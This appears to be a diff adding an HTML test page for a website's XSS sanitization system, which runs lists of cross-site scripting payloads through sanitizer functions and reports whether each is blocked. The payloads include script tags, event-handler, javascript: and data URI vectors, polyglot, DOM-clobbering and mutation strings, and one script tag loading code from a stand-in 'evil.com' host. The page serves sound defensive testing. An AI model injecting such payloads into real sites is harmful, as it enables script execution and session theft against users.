@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Protection System Test - ciaociao.mx</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .test-container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+        }
+        .test-section {
+            margin-bottom: 30px;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .test-section h3 {
+            color: #2c3e50;
+            margin-top: 0;
+        }
+        .test-input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .test-button {
+            background: #3498db;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        .test-button:hover {
+            background: #2980b9;
+        }
+        .danger-button {
+            background: #e74c3c;
+        }
+        .danger-button:hover {
+            background: #c0392b;
+        }
+        .success {
+            background: #d4edda;
+            color: #155724;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 10px 0;
+        }
+        .warning {
+            background: #fff3cd;
+            color: #856404;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 10px 0;
+        }
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 10px 0;
+        }
+        .metrics {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: monospace;
+        }
+        .test-result {
+            margin: 10px 0;
+            padding: 10px;
+            border-radius: 4px;
+        }
+        .status-indicator {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        .status-ok { background-color: #28a745; }
+        .status-warning { background-color: #ffc107; }
+        .status-error { background-color: #dc3545; }
+    </style>
+</head>
+<body>
+    <div class="test-container">
+        <h1>🛡️ XSS Protection System Test Suite</h1>
+        <p>Esta página prueba el sistema integral de protección XSS implementado para ciaociao.mx</p>
+        
+        <!-- System Status -->
+        <div class="test-section">
+            <h3>📊 System Status</h3>
+            <div id="systemStatus">Initializing...</div>
+            <div class="metrics" id="metricsDisplay">Loading metrics...</div>
+        </div>
+        
+        <!-- Real-time Input Testing -->
+        <div class="test-section">
+            <h3>⚡ Real-time Input Protection</h3>
+            <p>Tipo en estos campos para probar la sanitización en tiempo real:</p>
+            
+            <label>Text Input:</label>
+            <input type="text" class="test-input" id="testText" placeholder="Prueba escribir: <script>alert('XSS')</script>">
+            
+            <label>Email Input:</label>
+            <input type="email" class="test-input" id="testEmail" placeholder="test@example.com<script>alert('XSS')</script>">
+            
+            <label>Phone Input:</label>
+            <input type="tel" class="test-input" id="testPhone" placeholder="55 1234 5678<script>alert('XSS')</script>">
+            
+            <label>URL Input:</label>
+            <input type="url" class="test-input" id="testUrl" placeholder="https://example.com<script>alert('XSS')</script>">
+            
+            <label>Textarea:</label>
+            <textarea class="test-input" id="testTextarea" placeholder="Textarea con <script>alert('XSS')</script> contenido"></textarea>
+            
+            <div id="inputResults"></div>
+        </div>
+        
+        <!-- Malicious Payload Tests -->
+        <div class="test-section">
+            <h3>🎯 Malicious Payload Tests</h3>
+            <p>Estos tests verifican la protección contra diferentes tipos de ataques XSS:</p>
+            
+            <button class="test-button" onclick="testScriptInjection()">Test Script Injection</button>
+            <button class="test-button" onclick="testEventHandlers()">Test Event Handlers</button>
+            <button class="test-button" onclick="testJavascriptProtocol()">Test JavaScript Protocol</button>
+            <button class="test-button" onclick="testHTMLInjection()">Test HTML Injection</button>
+            <button class="test-button" onclick="testURLManipulation()">Test URL Manipulation</button>
+            <button class="test-button" onclick="testDataURI()">Test Data URI</button>
+            <button class="test-button" onclick="testSVGPayload()">Test SVG Payload</button>
+            
+            <div id="payloadResults"></div>
+        </div>
+        
+        <!-- Form Data Protection -->
+        <div class="test-section">
+            <h3>📝 Form Data Protection</h3>
+            <form id="testForm">
+                <input type="text" name="clientName" placeholder="Nombre del cliente" class="test-input">
+                <input type="email" name="clientEmail" placeholder="Email del cliente" class="test-input">
+                <input type="tel" name="clientPhone" placeholder="Teléfono del cliente" class="test-input">
+                <textarea name="observations" placeholder="Observaciones" class="test-input"></textarea>
+                <button type="button" class="test-button" onclick="testFormSanitization()">Test Form Sanitization</button>
+            </form>
+            <div id="formResults"></div>
+        </div>
+        
+        <!-- Performance Tests -->
+        <div class="test-section">
+            <h3>⚡ Performance Tests</h3>
+            <button class="test-button" onclick="testPerformance()">Run Performance Test</button>
+            <div id="performanceResults"></div>
+        </div>
+        
+        <!-- Bypass Attempts -->
+        <div class="test-section">
+            <h3>🔓 Advanced Bypass Tests</h3>
+            <p class="warning">⚠️ These tests attempt to bypass XSS protection using advanced techniques:</p>
+            
+            <button class="test-button danger-button" onclick="testEncodedPayloads()">Test Encoded Payloads</button>
+            <button class="test-button danger-button" onclick="testPolyglotPayloads()">Test Polyglot Payloads</button>
+            <button class="test-button danger-button" onclick="testDOMClobbering()">Test DOM Clobbering</button>
+            <button class="test-button danger-button" onclick="testMutationPayloads()">Test Mutation Payloads</button>
+            
+            <div id="bypassResults"></div>
+        </div>
+        
+        <!-- Security Logs -->
+        <div class="test-section">
+            <h3>📋 Security Logs</h3>
+            <button class="test-button" onclick="showSecurityLogs()">View Security Logs</button>
+            <button class="test-button" onclick="clearSecurityLogs()">Clear Logs</button>
+            <div id="securityLogs"></div>
+        </div>
+    </div>
+    
+    <!-- Scripts -->
+    <!-- DOMPurify XSS Protection with CDN Fallbacks -->
+    <script>
+        // Load DOMPurify with multiple CDN fallbacks
+        const domPurifyUrls = [
+            'https://cdn.jsdelivr.net/npm/dompurify@3.0.5/dist/purify.min.js',
+            'https://unpkg.com/dompurify@3.0.5/dist/purify.min.js',
+            'https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.5/purify.min.js'
+        ];
+        
+        let domPurifyLoaded = false;
+        
+        function loadDOMPurifyScript(index = 0) {
+            if (index >= domPurifyUrls.length) {
+                console.warn('⚠️ All DOMPurify CDNs failed, XSS protection will use fallback methods');
+                return;
+            }
+            
+            const script = document.createElement('script');
+            script.src = domPurifyUrls[index];
+            script.async = true;
+            
+            script.onload = function() {
+                domPurifyLoaded = true;
+                console.log(`✅ DOMPurify loaded from: ${domPurifyUrls[index]}`);
+                updateSystemStatus();
+            };
+            
+            script.onerror = function() {
+                console.warn(`❌ Failed to load DOMPurify from: ${domPurifyUrls[index]}`);
+                loadDOMPurifyScript(index + 1);
+            };
+            
+            document.head.appendChild(script);
+        }
+        
+        loadDOMPurifyScript();
+    </script>
+    
+    <!-- XSS Protection System -->
+    <script src="xss-protection.js"></script>
+    <script src="security-manager.js"></script>
+    
+    <!-- Test Suite Script -->
+    <script>
+        // Test Suite Implementation
+        let testResults = {
+            passed: 0,
+            failed: 0,
+            warnings: 0
+        };
+        
+        // System Status Check
+        function updateSystemStatus() {
+            const status = document.getElementById('systemStatus');
+            const metrics = document.getElementById('metricsDisplay');
+            
+            let statusHtml = '';
+            
+            // Check XSS Protection
+            if (window.xssProtection && window.xssProtection.isReady()) {
+                statusHtml += '<div><span class="status-indicator status-ok"></span>XSS Protection: Active</div>';
+            } else {
+                statusHtml += '<div><span class="status-indicator status-error"></span>XSS Protection: Inactive</div>';
+            }
+            
+            // Check DOMPurify
+            if (typeof DOMPurify !== 'undefined') {
+                statusHtml += '<div><span class="status-indicator status-ok"></span>DOMPurify: Loaded</div>';
+            } else {
+                statusHtml += '<div><span class="status-indicator status-warning"></span>DOMPurify: Not Available</div>';
+            }
+            
+            // Check SecurityManager
+            if (window.securityManager) {
+                statusHtml += '<div><span class="status-indicator status-ok"></span>Security Manager: Active</div>';
+            } else {
+                statusHtml += '<div><span class="status-indicator status-warning"></span>Security Manager: Not Active</div>';
+            }
+            
+            status.innerHTML = statusHtml;
+            
+            // Update metrics
+            if (window.xssProtection) {
+                const xssMetrics = window.xssProtection.getMetrics();
+                metrics.innerHTML = JSON.stringify(xssMetrics, null, 2);
+            } else {
+                metrics.innerHTML = 'XSS Protection metrics not available';
+            }
+        }
+        
+        // Test Functions
+        function testScriptInjection() {
+            const payloads = [
+                '<script>alert("XSS")</script>',
+                '<script>document.body.innerHTML="HACKED"</script>',
+                '<script src="http://evil.com/xss.js"></script>',
+                '<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>'
+            ];
+            
+            testPayloads('Script Injection', payloads);
+        }
+        
+        function testEventHandlers() {
+            const payloads = [
+                '<img src=x onerror=alert("XSS")>',
+                '<div onclick=alert("XSS")>Click me</div>',
+                '<body onload=alert("XSS")>',
+                '<input onfocus=alert("XSS") autofocus>'
+            ];
+            
+            testPayloads('Event Handlers', payloads);
+        }
+        
+        function testJavascriptProtocol() {
+            const payloads = [
+                'javascript:alert("XSS")',
+                'JAVASCRIPT:alert("XSS")',
+                'javascript:\u0061lert("XSS")',
+                'javascript:alert(String.fromCharCode(88,83,83))'
+            ];
+            
+            testPayloads('JavaScript Protocol', payloads, 'url');
+        }
+        
+        function testHTMLInjection() {
+            const payloads = [
+                '<iframe src="javascript:alert(\"XSS\")"></iframe>',
+                '<object data="javascript:alert(\"XSS\")"></object>',
+                '<embed src="javascript:alert(\"XSS\")"></embed>',
+                '<meta http-equiv="refresh" content="0;url=javascript:alert(\"XSS\");">'
+            ];
+            
+            testPayloads('HTML Injection', payloads, 'html');
+        }
+        
+        function testURLManipulation() {
+            const payloads = [
+                'http://evil.com?<script>alert("XSS")</script>',
+                'https://example.com\"onmouseover=alert("XSS")\"',
+                'ftp://evil.com<script>alert("XSS")</script>'
+            ];
+            
+            testPayloads('URL Manipulation', payloads, 'url');
+        }
+        
+        function testDataURI() {
+            const payloads = [
+                'data:text/html,<script>alert("XSS")</script>',
+                'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
+                'data:application/javascript,alert("XSS")'
+            ];
+            
+            testPayloads('Data URI', payloads, 'url');
+        }
+        
+        function testSVGPayload() {
+            const payloads = [
+                '<svg onload=alert("XSS")>',
+                '<svg><script>alert("XSS")</script></svg>',
+                '<svg><foreignObject><script>alert("XSS")</script></foreignObject></svg>'
+            ];
+            
+            testPayloads('SVG Payload', payloads, 'html');
+        }
+        
+        function testEncodedPayloads() {
+            const payloads = [
+                '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
+                '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
+                '\\x3cscript\\x3ealert(\"XSS\")\\x3c/script\\x3e'
+            ];
+            
+            testPayloads('Encoded Payloads', payloads);
+        }
+        
+        function testPolyglotPayloads() {
+            const payloads = [
+                'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'alert(\"XSS\")\'>'`,
+                '\'><\">\'"><img src=x onerror=alert(\"XSS\")>',
+                '"onclick=alert(\"XSS\")//'
+            ];
+            
+            testPayloads('Polyglot Payloads', payloads);
+        }
+        
+        function testDOMClobbering() {
+            const payloads = [
+                '<form id="test"><input name="innerHTML" value="<img src=x onerror=alert(\"XSS\")"></form>',
+                '<img name="test" id="test" src=x onerror=alert(\"XSS\")>'
+            ];
+            
+            testPayloads('DOM Clobbering', payloads, 'html');
+        }
+        
+        function testMutationPayloads() {
+            const payloads = [
+                '<math><mi//xlink:href="data:x,<script>alert(\"XSS\")</script>">',
+                '<select><noscript></select><script>alert(\"XSS\")</script>'
+            ];
+            
+            testPayloads('Mutation Payloads', payloads, 'html');
+        }
+        
+        // Generic payload testing function
+        function testPayloads(testName, payloads, type = 'text') {
+            const results = document.getElementById('payloadResults');
+            let html = `<h4>Testing: ${testName}</h4>`;
+            
+            payloads.forEach((payload, index) => {
+                try {
+                    let sanitized;
+                    
+                    if (window.xssProtection) {
+                        switch (type) {
+                            case 'html':
+                                sanitized = window.xssProtection.sanitizeHTML(payload);
+                                break;
+                            case 'url':
+                                sanitized = window.xssProtection.sanitizeURL(payload);
+                                break;
+                            default:
+                                sanitized = window.xssProtection.sanitizeText(payload);
+                        }
+                    } else {
+                        sanitized = 'XSS Protection not available';
+                    }
+                    
+                    const isBlocked = payload !== sanitized;
+                    const status = isBlocked ? 'success' : 'error';
+                    
+                    if (isBlocked) {
+                        testResults.passed++;
+                    } else {
+                        testResults.failed++;
+                    }
+                    
+                    html += `
+                        <div class="test-result ${status}">
+                            <strong>Payload ${index + 1}:</strong> ${isBlocked ? '✅ BLOCKED' : '❌ NOT BLOCKED'}<br>
+                            <small>Original: ${escapeHtml(payload)}</small><br>
+                            <small>Sanitized: ${escapeHtml(sanitized)}</small>
+                        </div>
+                    `;
+                } catch (error) {
+                    testResults.warnings++;
+                    html += `
+                        <div class="test-result warning">
+                            <strong>Payload ${index + 1}:</strong> ⚠️ ERROR<br>
+                            <small>Error: ${error.message}</small>
+                        </div>
+                    `;
+                }
+            });
+            
+            html += `<p><strong>Summary:</strong> ${testResults.passed} passed, ${testResults.failed} failed, ${testResults.warnings} warnings</p>`;
+            results.innerHTML = html;
+        }
+        
+        function testFormSanitization() {
+            const form = document.getElementById('testForm');
+            const formData = new FormData(form);
+            const data = {};
+            
+            for (let [key, value] of formData.entries()) {
+                data[key] = value;
+            }
+            
+            // Inject malicious payloads
+            data.maliciousScript = '<script>alert("Form XSS")</script>';
+            data.maliciousEvent = '<img src=x onerror=alert("Form XSS")>';
+            data.maliciousUrl = 'javascript:alert("Form XSS")';
+            
+            let sanitized;
+            if (window.xssProtection) {
+                sanitized = window.xssProtection.sanitizeFormData(data);
+            } else if (window.utils) {
+                sanitized = window.utils.sanitizeFormData(data);
+            } else {
+                sanitized = data;
+            }
+            
+            const results = document.getElementById('formResults');
+            results.innerHTML = `
+                <h4>Form Sanitization Test</h4>
+                <div class="success">
+                    <strong>Original Data:</strong><br>
+                    <pre>${escapeHtml(JSON.stringify(data, null, 2))}</pre>
+                </div>
+                <div class="success">
+                    <strong>Sanitized Data:</strong><br>
+                    <pre>${escapeHtml(JSON.stringify(sanitized, null, 2))}</pre>
+                </div>
+            `;
+        }
+        
+        function testPerformance() {
+            const iterations = 1000;
+            const testString = '<script>alert("XSS")</script>'.repeat(10);
+            
+            const startTime = performance.now();
+            
+            for (let i = 0; i < iterations; i++) {
+                if (window.xssProtection) {
+                    window.xssProtection.sanitizeText(testString);
+                }
+            }
+            
+            const endTime = performance.now();
+            const totalTime = endTime - startTime;
+            const avgTime = totalTime / iterations;
+            
+            const results = document.getElementById('performanceResults');
+            results.innerHTML = `
+                <div class="${avgTime < 5 ? 'success' : avgTime < 10 ? 'warning' : 'error'}">
+                    <h4>Performance Test Results</h4>
+                    <p><strong>Iterations:</strong> ${iterations}</p>
+                    <p><strong>Total Time:</strong> ${totalTime.toFixed(2)}ms</p>
+                    <p><strong>Average Time:</strong> ${avgTime.toFixed(4)}ms per sanitization</p>
+                    <p><strong>Performance Rating:</strong> 
+                        ${avgTime < 5 ? '✅ Excellent' : avgTime < 10 ? '⚠️ Good' : '❌ Needs Optimization'}
+                    </p>
+                </div>
+            `;
+        }
+        
+        function showSecurityLogs() {
+            const logs = window.xssProtection ? window.xssProtection.getSecurityLogs() : [];
+            const results = document.getElementById('securityLogs');
+            
+            if (logs.length === 0) {
+                results.innerHTML = '<div class="warning">No security logs found</div>';
+                return;
+            }
+            
+            let html = '<h4>Security Event Logs</h4>';
+            logs.slice(-20).forEach((log, index) => {
+                html += `
+                    <div class="test-result warning">
+                        <strong>${log.timestamp}</strong> - ${log.type}<br>
+                        <small>${escapeHtml(log.content)}</small>
+                    </div>
+                `;
+            });
+            
+            results.innerHTML = html;
+        }
+        
+        function clearSecurityLogs() {
+            if (window.xssProtection) {
+                window.xssProtection.clearLogs();
+            }
+            document.getElementById('securityLogs').innerHTML = '<div class="success">Security logs cleared</div>';
+        }
+        
+        // Utility functions
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+        
+        // Monitor input changes
+        function setupInputMonitoring() {
+            const inputs = document.querySelectorAll('.test-input');
+            const results = document.getElementById('inputResults');
+            
+            inputs.forEach(input => {
+                input.addEventListener('input', (e) => {
+                    const value = e.target.value;
+                    if (value.includes('<') || value.includes('script') || value.includes('javascript:')) {
+                        results.innerHTML = `
+                            <div class="warning">
+                                ⚠️ Potentially malicious content detected in ${e.target.id}
+                            </div>
+                        `;
+                    }
+                });
+            });
+        }
+        
+        // Initialize when page loads
+        document.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => {
+                updateSystemStatus();
+                setupInputMonitoring();
+            }, 1000);
+            
+            // Update status periodically
+            setInterval(updateSystemStatus, 5000);
+        });
+    </script>
+</body>
+</html>
